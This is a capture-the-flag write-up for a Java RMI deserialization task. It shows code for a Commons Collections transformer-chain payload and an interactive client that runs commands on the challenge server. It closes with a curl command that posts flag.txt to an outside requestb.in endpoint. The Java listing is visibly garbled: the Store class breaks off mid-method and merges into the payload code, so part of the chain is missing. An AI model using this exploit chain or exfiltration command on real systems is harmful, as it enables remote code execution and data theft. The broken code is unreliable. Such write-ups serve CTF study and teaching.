# Array List (Pwn, 350p)
The task is similar to https://github.com/p4-team/ctf/tree/master/2018-01-20-insomnihack/pwn_magic_hat and a bit to https://github.com/p4-team/ctf/tree/master/2016-08-21-bioterra-ctf/akashic_records
In short: we have a Java RMI server running, and we need to craft a deserialization chain to exploit this server.
We get a [client](client.jar) and [library](notsoserial-modified.jar) which is added on the server.
We can add those jars to IntelliJ project and it will decompile the code on the fly for us.
Client is trivial, it connects to the server and uses the Remote API.
The API is:
```java
public interface Service extends Remote {
    Store getStore() throws RemoteException;
    Store createArrayList(Store var1) throws RemoteException;
    Store createFastArrayList(Store var1) throws RemoteException;
    String getString(Store var1, int var2) throws RemoteException;
    Store addRandom(Store var1, int var2) throws RemoteException;
}
```
And Store class is:
```java
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Collection;
import org.apache.commons.collections.FastArrayList;
public class Store implements Serializable {
    private static final long serialVersionUID = -878586296715953149L;
    public Collection[] collections = new Collection[10];
    public int counter = 0;
    private static final int MAX_COLLECTIONS = 10;
    public Store() {
    }
    public int createArrayList() {
        if (this.counter == 10) {
            return 0;
        } else {
            ArrayList list = new ArrayList();
            this.collections[this.counter++] = list;
            return 1;
        }
    }
    public int createFastArrayList() {
        if (this.counter == 10) {
            return 0;
        } else {
            FastArrayList list = new FastArrayList();
            this.collections[this.counter++] = list;
            return 1;
        }
    }
    public int insert(int index, Object obj) {
        if (index >= 0 && index  backingSet = new HashSet<>();
	Set transformedSet = TransformedSet.decorate(backingSet, transformerChain);
	Store store = new Store();
	store.collections[0] = transformedSet;
	return store;
}
```
It's very useful that the server has `addRandom` method, which adds something to the collection we provide.
Otherwise we would need a bit more magic, to store values on our side, without invoking the transformer chain.
This would require adding a "fake" transformer, adding values and then substituting the transformer for the chain, using reflection (so it doesn't trigger).
Fortunately we can simply send empty Set, and ask server to add values, which will trigger the chain.
Now we just need to connect to the remote endpoint and start sending commands:
```java
public static void main(final String[] args) throws Exception {
	System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
	Registry registry = LocateRegistry.getRegistry(InetAddress.getByName("arraylist.dhavalkapil.com").getHostName(), 9999);
	Service service = (Service) registry.lookup("backdoor");
	Scanner sc = new Scanner(System.in);
	while (true) {
		System.out.print("> ");
		execCommand(service, sc.nextLine());
	}
}
private static void execCommand(Service service, String command) {
	try {
		service.addRandom(preparePayload(command), 0);
	} catch (Exception e) {
		e.printStackTrace();
	}
}
```
We know the flag is in `flag.txt` file so we can just grab it with simple `curl -d @flag.txt -X POST https://requestb.in/XXXXX` and we get `CTF{j4v4_64d637_ch41n1n6_15_fun}`